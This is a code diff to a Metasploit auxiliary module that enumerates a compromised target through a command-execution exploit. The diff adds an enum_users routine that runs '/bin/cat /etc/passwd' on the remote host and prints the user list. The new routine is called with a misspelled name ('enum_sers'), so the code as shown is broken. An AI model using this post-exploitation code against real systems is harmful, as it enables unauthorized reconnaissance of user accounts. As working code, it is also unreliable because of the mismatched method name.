@@ -58,7 +58,14 @@ class Metasploit3 < Msf::Auxiliary
         print_good("    Date: " + date)
         print_good("    Uptime: " + uptime)
         print_good("    Kernel: " + kernel)
-     end
+    end
+    
+    def enum_users(uri)
+        print_status("Enumerating User Information")
+        passwd = exploit(uri, "/bin/cat /etc/passwd")
+
+        print_good("    Users:\n" + passwd + "\n")
+    end
     
     def enum_network(uri)
         print_status("Enumerating Network Information")
@@ -87,6 +94,7 @@ class Metasploit3 < Msf::Auxiliary
          uri = target_uri.path
 
          enum_sysinfo(uri)
+         enum_sers(uri)
          enum_network(uri)
 
      end
